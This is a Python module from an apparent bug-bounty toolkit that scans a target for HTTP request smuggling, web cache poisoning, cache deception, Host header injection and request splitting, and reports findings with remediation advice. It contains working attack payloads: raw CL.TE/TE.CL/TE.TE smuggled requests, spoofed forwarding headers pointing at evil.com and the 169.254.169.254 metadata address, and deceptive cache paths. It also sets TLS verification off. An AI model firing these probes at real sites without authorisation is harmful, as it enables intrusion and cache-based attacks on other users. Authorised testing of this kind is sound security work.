"""
HTTP request smuggling & web cache poisoning — 2026 techniques.

Tests: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE smuggling,
web cache poisoning, cache deception, header injection, host header attacks.
"""

from __future__ import annotations

import re
import json
import time
import hashlib
import asyncio
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Any, Tuple
from urllib.parse import urlparse, urljoin

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class SmugglingFinding:
    """Single smuggling / cache poisoning finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    remediation: str = ""


@dataclass
class SmugglingResult:
    """Complete smuggling assessment result."""
    target: str
    findings: List[SmugglingFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


class HTTPSmugglingTester:
    """
    HTTP request smuggling and web cache poisoning tester.

    2026 attack vectors:
    - CL.TE smuggling (Content-Length vs Transfer-Encoding mismatch)
    - TE.CL smuggling (Transfer-Encoding vs Content-Length mismatch)
    - TE.TE smuggling (Obfuscated Transfer-Encoding)
    - H2.CL smuggling (HTTP/2 Content-Length smuggling)
    - H2.TE smuggling (HTTP/2 Transfer-Encoding smuggling)
    - Web cache poisoning (X-Forwarded-Host, X-Original-URL)
    - Cache deception (path confusion)
    - Host header injection
    - Header injection (CRLF)
    - Request splitting
    """

    # Common endpoints for testing
    TEST_ENDPOINTS = [
        "/",
        "/index.html",
        "/api",
        "/proxy",
        "/fetch",
        "/redirect",
        "/login",
        "/admin",
        "/debug",
        "/health",
        "/status",
        "/version",
    ]

    # Cache poisoning headers
    CACHE_HEADERS = {
        "X-Forwarded-Host": ["evil.com", "attacker.com", "127.0.0.1"],
        "X-Original-URL": ["/admin", "/internal", "/debug", "/.env"],
        "X-Rewrite-URL": ["/admin", "/internal", "/debug", "/.env"],
        "X-Forwarded-For": ["127.0.0.1", "169.254.169.254", "10.0.0.1"],
        "X-Real-IP": ["127.0.0.1", "169.254.169.254"],
        "X-Client-IP": ["127.0.0.1", "169.254.169.254"],
        "X-Original-Host": ["evil.com", "internal.com"],
        "X-Forwarded-Server": ["evil.com", "internal.com"],
        "X-Host": ["evil.com", "127.0.0.1"],
    }

    # HTTP smuggling payloads
    SMUGGLING_PAYLOADS = [
        {
            "name": "CL.TE Smuggling",
            "category": "cl_te",
            "description": "Content-Length/Transfer-Encoding mismatch",
            "payload": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "SMUGGLED"
            ),
            "severity": "critical",
        },
        {
            "name": "TE.CL Smuggling",
            "category": "te_cl",
            "description": "Transfer-Encoding/Content-Length mismatch",
            "payload": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 3\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "8\r\n"
                "SMUGGLED\r\n"
                "0\r\n"
                "\r\n"
            ),
            "severity": "critical",
        },
        {
            "name": "TE.TE Smuggling (Obfuscated)",
            "category": "te_te",
            "description": "Obfuscated Transfer-Encoding header",
            "payload": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 3\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Transfer-encoding: identity\r\n"
                "\r\n"
                "8\r\n"
                "SMUGGLED\r\n"
                "0\r\n"
                "\r\n"
            ),
            "severity": "critical",
        },
        {
            "name": "CL.TE via GET",
            "category": "cl_te",
            "description": "CL.TE smuggling via GET request",
            "payload": (
                "GET / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 0\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
            ),
            "severity": "high",
        },
        {
            "name": "Header Injection (CRLF)",
            "category": "header_injection",
            "description": "CRLF injection in headers",
            "payload": (
                "GET / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "X-Injected: true\r\n"
                "X-Injected-Header: evil\r\n"
                "\r\n"
            ),
            "severity": "high",
        },
    ]

    # Cache deception payloads
    CACHE_DECEPTION_PAYLOADS = [
        {
            "name": "Cache Deception (.css)",
            "category": "cache_deception",
            "path": "/index.html.css",
            "severity": "high",
        },
        {
            "name": "Cache Deception (.js)",
            "category": "cache_deception",
            "path": "/admin.js",
            "severity": "high",
        },
        {
            "name": "Cache Deception (.png)",
            "category": "cache_deception",
            "path": "/secret.png",
            "severity": "high",
        },
        {
            "name": "Cache Deception (Path Confusion)",
            "category": "cache_deception",
            "path": "/admin%00.css",
            "severity": "high",
        },
        {
            "name": "Cache Deception (Double Extension)",
            "category": "cache_deception",
            "path": "/admin.php.css",
            "severity": "high",
        },
    ]

    def __init__(
        self,
        target: str,
        timeout: float = 10.0,
        proxy: Optional[str] = None,
        verbose: bool = False,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.proxy = proxy
        self.verbose = verbose

        self._client = httpx.AsyncClient(
            timeout=timeout,
            follow_redirects=False,  # Important for smuggling detection
            proxy=proxy,
            verify=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
        )

    async def close(self):
        await self._client.aclose()

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def test_all(self) -> SmugglingResult:
        """Run all HTTP smuggling and cache poisoning tests."""
        result = SmugglingResult(target=self.target)

        logger.info(f"[*] Starting HTTP smuggling & cache poisoning tests: {self.target}")

        host = urlparse(self.target).hostname or "localhost"
        
        sem = asyncio.Semaphore(15)

        async def bounded_smuggle(ep, payload_def, host):
            async with sem:
                return await self._test_smuggling(ep, payload_def, host)

        # Phase 1: HTTP request smuggling
        tasks = []
        for ep in self.TEST_ENDPOINTS:
            for payload_def in self.SMUGGLING_PAYLOADS:
                tasks.append(bounded_smuggle(ep, payload_def, host))
            result.endpoints_tested += 1
            
        smuggle_results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in smuggle_results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        async def bounded_cache_poison(ep, header, value):
            async with sem:
                return await self._test_cache_poisoning(ep, header, value)

        # Phase 2: Web cache poisoning
        poison_tasks = []
        for ep in self.TEST_ENDPOINTS:
            for header, values in self.CACHE_HEADERS.items():
                for value in values:
                    poison_tasks.append(bounded_cache_poison(ep, header, value))
                    
        poison_results = await asyncio.gather(*poison_tasks, return_exceptions=True)
        for r in poison_results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        async def bounded_cache_deception(payload_def):
            async with sem:
                return await self._test_cache_deception(payload_def)

        # Phase 3: Cache deception
        deception_tasks = [bounded_cache_deception(p) for p in self.CACHE_DECEPTION_PAYLOADS]
        deception_results = await asyncio.gather(*deception_tasks, return_exceptions=True)
        for r in deception_results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        async def bounded_host_header(ep):
            async with sem:
                return await self._test_host_header(ep)

        # Phase 4: Host header attacks
        host_tasks = [bounded_host_header(ep) for ep in ["/", "/api", "/login"]]
        host_results = await asyncio.gather(*host_tasks, return_exceptions=True)
        for r in host_results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        # Phase 5: Request splitting
        finding = await self._test_request_splitting()
        if finding:
            result.findings.append(finding)

        logger.info(
            f"[+] Smuggling & cache poisoning tests complete: {len(result.findings)} findings"
        )
        return result

    def _save_results(self, result: "SmugglingResult", output_dir: str) -> str:
        """Persist smuggling results to <output_dir>/smuggling_<host>.json."""
        host = urlparse(self.target).hostname or self.target.replace("://", "_")
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        filepath = out / f"smuggling_{host}.json"
        payload = {
            "target": result.target,
            "timestamp": result.timestamp,
            "endpoints_tested": result.endpoints_tested,
            "summary": result.summary,
            "findings": [asdict(f) for f in result.findings],
        }
        filepath.write_text(json.dumps(payload, indent=2, default=str))
        logger.info(f"[+] Results saved → {filepath}")
        return str(filepath)

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_smuggling(
        self, endpoint: str, payload_def: Dict[str, Any], host: str
    ) -> Optional[SmugglingFinding]:
        """Test for HTTP request smuggling."""
        url = f"{self.target}{endpoint}"
        payload = payload_def["payload"].replace("{host}", host)

        try:
            # Send raw smuggling payload
            resp = await self._client.post(
                url,
                content=payload,
                headers={
                    "Content-Type": "application/octet-stream",
                    "Transfer-Encoding": "chunked",
                },
            )

            # Check for smuggling indicators
            body = resp.text.lower()

            # Indicator 1: "SMUGGLED" appears in response (CL.TE worked)
            if "smuggled" in body:
                return SmugglingFinding(
                    category=payload_def["category"],
                    severity=payload_def["severity"],
                    title=f"HTTP Smuggling: {payload_def['name']}",
                    description=f"Endpoint {endpoint} appears vulnerable to {payload_def['description']}. "
                    f"The smuggled content was reflected in the response.",
                    endpoint=endpoint,
                    payload=payload[:500],
                    evidence=f"Response: {resp.text[:500]}",
                    remediation="Ensure consistent HTTP parsing across all proxies. "
                    "Disable or normalize Transfer-Encoding headers.",
                )

            # Indicator 2: Different response timing
            start = time.time()
            resp2 = await self._client.post(
                url,
                content=payload,
                headers={"Content-Type": "application/octet-stream"},
            )
            elapsed = time.time() - start

            # Very slow response may indicate smuggling queue buildup
            if elapsed > 5 and resp2.status_code in (200, 502, 504):
                return SmugglingFinding(
                    category=payload_def["category"],
                    severity="medium",
                    title=f"HTTP Smuggling (Timing): {payload_def['name']}",
                    description=f"Endpoint {endpoint} showed unusual timing with smuggling payload. "
                    f"Response took {elapsed:.1f}s.",
                    endpoint=endpoint,
                    payload=payload[:500],
                    evidence=f"Response time: {elapsed:.1f}s, Status: {resp2.status_code}",
                    remediation="Investigate HTTP parsing behavior under malformed requests.",
                )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] Smuggling test failed for {endpoint}: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_cache_poisoning(
        self, endpoint: str, header: str, value: str
    ) -> Optional[SmugglingFinding]:
        """Test for web cache poisoning via header manipulation."""
        url = f"{self.target}{endpoint}"

        try:
            # Step 1: Send request with poisoned header
            resp1 = await self._client.get(
                url,
                headers={header: value},
            )

            # Check if header is reflected in response
            body1 = resp1.text.lower()
            if value.lower() in body1:
                return SmugglingFinding(
                    category="cache_poisoning",
                    severity="high",
                    title=f"Cache Poisoning: {header}: {value}",
                    description=f"Endpoint {endpoint} reflects {header} header in response body. "
                    f"If cached, this could poison the cache for other users.",
                    endpoint=endpoint,
                    payload=f"{header}: {value}",
                    evidence=f"Response contains: {value}",
                    remediation="Strip or override sensitive headers at the reverse proxy. "
                    "Implement cache key normalization.",
                )

            # Step 2: Check if response varies by header
            resp2 = await self._client.get(url)
            if resp1.headers.get("Cache-Control") and "public" in resp1.headers.get("Cache-Control", ""):
                if resp1.text != resp2.text:
                    return SmugglingFinding(
                        category="cache_poisoning",
                        severity="high",
                        title=f"Cache Poisoning (Vary): {header}",
                        description=f"Endpoint {endpoint} returns different responses with {header} header "
                        f"but uses public caching.",
                        endpoint=endpoint,
                        payload=f"{header}: {value}",
                        evidence=f"Responses differ: {len(resp1.text)} vs {len(resp2.text)} bytes",
                        remediation="Implement proper cache key generation including relevant headers.",
                    )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] Cache poisoning test failed: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_cache_deception(
        self, payload_def: Dict[str, Any]
    ) -> Optional[SmugglingFinding]:
        """Test for cache deception attacks."""
        url = f"{self.target}{payload_def['path']}"

        try:
            resp = await self._client.get(url)

            # Check if deceptive path is served with caching headers
            cache_control = resp.headers.get("Cache-Control", "")
            etag = resp.headers.get("ETag", "")
            last_modified = resp.headers.get("Last-Modified", "")

            if resp.status_code == 200 and (
                "public" in cache_control or etag or last_modified
            ):
                # Check if response contains sensitive content
                body = resp.text.lower()
                sensitive_indicators = [
                    "password", "token", "secret", "api_key",
                    "authorization", "session", "cookie",
                    "user", "admin", "private",
                ]

                has_sensitive = any(ind in body for ind in sensitive_indicators)

                return SmugglingFinding(
                    category="cache_deception",
                    severity=payload_def["severity"],
                    title=f"Cache Deception: {payload_def['name']}",
                    description=f"Path {payload_def['path']} is served with caching headers. "
                    f"{'Contains potentially sensitive content.' if has_sensitive else ''}",
                    endpoint=payload_def["path"],
                    evidence=f"Cache-Control: {cache_control}, Status: {resp.status_code}",
                    remediation="Normalize URL paths before caching. Don't cache responses "
                    "for requests with unusual extensions.",
                )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] Cache deception test failed: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_host_header(self, endpoint: str) -> Optional[SmugglingFinding]:
        """Test for Host header injection attacks."""
        url = f"{self.target}{endpoint}"

        evil_hosts = [
            "evil.com",
            "attacker.com",
            "127.0.0.1",
            "localhost",
            "internal.com",
            "admin.com",
            "null",
            "0",
        ]

        for evil_host in evil_hosts:
            try:
                resp = await self._client.get(
                    url,
                    headers={"Host": evil_host},
                )

                body = resp.text.lower()

                # Check if evil host is reflected
                if evil_host.lower() in body:
                    return SmugglingFinding(
                        category="host_header_injection",
                        severity="high",
                        title=f"Host Header Injection: {evil_host}",
                        description=f"Endpoint {endpoint} reflects the Host header value in response. "
                        f"This could enable password reset poisoning, cache poisoning, or SSRF.",
                        endpoint=endpoint,
                        payload=f"Host: {evil_host}",
                        evidence=f"Response contains: {evil_host}",
                        remediation="Validate Host header against allowlist. Don't reflect "
                        "Host header in responses.",
                    )

                # Check for password reset poisoning
                if "/login" in endpoint or "/reset" in endpoint or "/register" in endpoint:
                    if resp.status_code in (200, 302):
                        return SmugglingFinding(
                            category="host_header_injection",
                            severity="critical",
                            title=f"Password Reset Poisoning: {evil_host}",
                            description=f"Login/reset endpoint {endpoint} accepts arbitrary Host header. "
                            f"Could be used for password reset poisoning.",
                            endpoint=endpoint,
                            payload=f"Host: {evil_host}",
                            evidence=f"Status: {resp.status_code}",
                            remediation="Validate Host header against configured domains.",
                        )

            except Exception:
                pass

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_request_splitting(self) -> Optional[SmugglingFinding]:
        """Test for HTTP request splitting."""
        url = f"{self.target}/"

        try:
            # Request splitting: inject second request via headers
            payload = (
                "GET /admin HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "X-Injected: split\r\n"
                "\r\n"
                "GET /secret HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "\r\n"
            )

            host = urlparse(self.target).hostname or "localhost"
            payload = payload.replace("{host}", host)

            resp = await self._client.post(
                url,
                content=payload,
                headers={"Content-Type": "application/octet-stream"},
            )

            body = resp.text.lower()

            # Check if second request was processed
            if "secret" in body or "admin" in body:
                return SmugglingFinding(
                    category="request_splitting",
                    severity="critical",
                    title="HTTP Request Splitting",
                    description="Endpoint appears vulnerable to HTTP request splitting. "
                    "Multiple requests were processed from a single connection.",
                    endpoint=url,
                    payload=payload[:500],
                    evidence=f"Response: {resp.text[:500]}",
                    remediation="Validate and sanitize all HTTP headers. "
                    "Reject requests with multiple Host headers.",
                )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] Request splitting test failed: {e}")

        return None
